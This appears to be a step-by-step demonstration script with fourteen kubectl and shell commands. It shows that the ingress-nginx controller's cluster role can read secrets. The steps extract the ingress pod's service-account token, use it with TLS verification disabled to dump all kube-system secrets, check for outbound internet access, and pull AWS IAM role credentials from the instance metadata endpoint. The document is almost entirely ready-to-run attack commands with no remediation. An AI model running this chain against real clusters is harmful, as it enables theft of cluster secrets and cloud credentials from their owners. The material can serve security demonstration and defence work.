name: step01
  description: deploy nginx ingeress controller to the cluster
  command: kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.40.2/deploy/static/provider/aws/deploy.yaml

name: step02
  description: set the ingress pod name as an env var
  command: POD_NAME=$(kubectl get pods -n ingress-nginx --field-selector status.phase=Running -o json | jq -r '.items[].metadata.name')

name: step03
  description: validate list all secrets in the ingress cluster role
  command: kubectl get clusterroles ingress-nginx --all-namespaces -o=yaml

name: step04
  description: demonstrate how list all secrets is with the admin kubeconfig
  command: kubectl get secrets --all-namespaces -o=yaml

name: step05
  description: filter the secrets owned by service accounts
  command: kubectl get secrets --all-namespaces -o=json | jq '.items[].metadata.annotations' | grep 'service-account.name'

name: step06
  description: set the ingress nginx as an env var
  command: NAMESPACE=ingress-nginx

name: step07
  description: set the ingress token as an env var
  command: TOKEN=$(kubectl exec $POD_NAME -n $NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

name: step08
  description: find the kubernetes api server
  command: kubectl exec $POD_NAME -n $NAMESPACE -- netstat | grep kubernetes

name: step09
  description: set the api server address as an env var, should be fqdn
  command: API_SERVER=<REPLACE WITH OUTPUT FROM STEP08>

name: step10
  description: test connectivity to the api server from within the pod
  command: kubectl exec $POD_NAME -n $NAMESPACE -- curl https://$API_SERVER/api --header "Authorization: Bearer $TOKEN" --insecure

name: step11
  description: get all kube-system secrets from within the pod using the ingress token
  command: kubectl exec $POD_NAME -n $NAMESPACE -- curl https://$API_SERVER/api/v1/namespaces/kube-system/secrets --header "Authorization: Bearer $TOKEN" --insecure

name: step12
  description: test egress internet connectivity
  command: kubectl exec $POD_NAME -n $NAMESPACE -- curl https://ipinfo.io/json

name: step13
  description: set the aws node name as an env var
  command: NODE=$(kubectl exec $POD_NAME -n $NAMESPACE -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

name: step14
  description: set the metadata token as an env ver in one liner
  command: NODE=$(kubectl exec $POD_NAME -n $NAMESPACE -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && METADATA_TOKEN=$(kubectl exec $POD_NAME -n $NAMESPACE -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$NODE)
